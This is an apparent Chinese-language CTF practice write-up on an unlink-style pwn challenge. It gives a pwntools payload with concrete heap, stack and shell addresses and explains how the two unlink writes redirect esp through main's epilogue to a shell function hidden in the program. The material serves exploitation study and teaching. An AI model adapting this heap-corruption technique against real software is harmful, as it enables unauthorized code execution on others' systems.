一道unlink的pwn练习

unlink

这是一道类似unlink程序的题目，通过完成这道练习加深对unlink的理解。

程序部分通过指针的操作模拟unlink：

gets之前的数据结构为：

其中:
v4 = 0x804b410
v5 = 0x804b440
v6 = 0x804b428

而unlink函数的操作类似为：(P为指针v6)

p->fd->bk = p->bk
p->bk->fd = p->fd

我们直接跳到payload部分来解释这一段，比如在gets中，我们输入这样的一段payload:

shell_addr = 0x80484eb
p.sendline(‘A’*16 + p32(heap_addr+0x24) + p32(stack_addr+0x10) + p32(shell_addr))
这样，上图中的数据变为：

如上图所示，经过unlink函数时，会进行这样的操作：

[0x804b434+4] = 0xffffd0c4, 即上面的0x804b438中的值变为0xffffd0c4
[0xffffd0c4] = 0x804b434, 即0xffffd0c4中的值变为0x804b434

然后我们再来看main函数中的最后一段汇编代码：

先是mov ecx, [ebp-4] #调试的时候看出来的是[ebp-0x4]

其实0xffffd0c4是我们精心构造的，其实就是ebp-4就是我们的0xffffd0c4,所以此时ecx = [0xffffd0c4] = 0x804b434

然后lea esp, [ecx-4]
即esp = 0x804b430,就是藏在程序中的shellcode的地址：

ret之后就获得了shell。

其实中间遇到过一个问题：为什么要这么绕呢，为什么不能直接将FD->bk替换成shellcode地址呢？
这是因为unlink需要经过两个步骤，如果只考虑FD->bk替换，那么BK->fd替换时，有可能造成BK->fd为text段不可写，所以使用这种迂回的办法。
